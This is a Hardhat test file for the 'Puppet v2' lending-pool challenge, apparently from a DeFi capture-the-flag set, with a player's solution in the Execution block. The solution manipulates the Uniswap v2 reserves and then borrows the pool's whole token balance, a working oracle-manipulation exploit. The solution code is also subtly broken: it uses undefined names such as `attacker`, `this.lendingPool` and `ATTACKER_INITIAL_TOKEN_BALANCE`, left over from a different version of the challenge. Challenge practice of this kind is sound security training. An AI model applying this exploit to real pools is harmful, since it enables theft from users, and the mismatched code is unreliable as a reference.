const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { parseEther, formatEther } = require("ethers/lib/utils");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Puppet v2', function () {
    let deployer, player;
    let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        uniswapRouter = await UniswapRouterFactory.deploy(
            uniswapFactory.address,
            weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        uniswapExchange = await UniswapPairFactory.attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
        expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);
            
        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            weth.address,
            token.address,
            uniswapExchange.address,
            uniswapFactory.address
        );

        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Check pool's been correctly setup
        expect(
            await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)
        ).to.eq(3n * 10n ** 17n);
        expect(
            await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.eq(300000n * 10n ** 18n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE 
         * I somehow have to manipulate the price using ETH and DVTs,
         * to make either WETH or ETH worth more than what tokens are worth.
        */

        /** Since the pool is getting the price mainly based on the reserves, the only thing
         * we have access to tamper are the reserves. 
         * We can do this in several ways:
         *  We can try to directly transfer to the exchange
         *  We can try to swap the reserves
         *  We can try to buy/sell reserves
         *  We can add liquidity
         **/


        getBalance = ethers.provider.getBalance
        lp = this.lendingPool.connect(attacker);
        token = this.token.connect(attacker);
        weth = this.weth.connect(attacker);
        uniSwapExchange = this.uniswapExchange.connect(attacker); // pair
        uniSwapRouter = this.uniswapRouter.connect(attacker);
        
        // Check our current status
        let currentTokens = await token.balanceOf(attacker.address); 
        let currentWeth = await weth.balanceOf(attacker.address);
        let currentEth = await getBalance(attacker.address);

        async function info() {
            // Check our current status again. 
            currentTokens = await token.balanceOf(attacker.address); 
            currentWeth = await weth.balanceOf(attacker.address);
            currentEth = await getBalance(attacker.address);
            console.log(`\n## INFO ##`)
            console.log(`# Your current balance is: ${formatEther(currentTokens)} DVT, ${formatEther(currentWeth)} WETH and ${formatEther(currentEth)} ETH`);

            [_reserve0, _reserve1, _blockTimestampLast] = await uniSwapExchange.getReserves();
            console.log(`# reserve0 (DVT): ${formatEther(_reserve0)}, reserve1 (WETH): ${formatEther(_reserve1)}, blockTimeStamp: ${_blockTimestampLast}`);

            wethNeeded = await lp.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
            console.log(`# The current amount of WETH needed to steal 1kk DVTs is: ${formatEther(wethNeeded)}`);
            console.log(`**********************************************************`)
        }

        async function deadline() {
            return (await ethers.provider.getBlock('latest')).timestamp * 2
        }

        await info();

        // Let's swap our ETH for WETH.
        await weth.deposit({value: parseEther("19.8")});

        await token.approve(uniSwapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await weth.approve(uniSwapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);

        // function swapExactTokensForTokens(
        //     uint amountIn,
        //     uint amountOutMin,
        //     address[] calldata path,
        //     address to,
        //     uint deadline
        //   ) external returns (uint[] memory amounts);

        // Let's swap them. Since we have more of the asset that can change drastically the value, start with this.
        await uniSwapRouter.swapExactTokensForTokens(ATTACKER_INITIAL_TOKEN_BALANCE, 0, [token.address, weth.address], attacker.address, deadline());

        await info();

        await weth.approve(lp.address, wethNeeded);
        await lp.borrow(POOL_INITIAL_TOKEN_BALANCE);

        await info();

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player has taken all tokens from the pool        
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0);

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});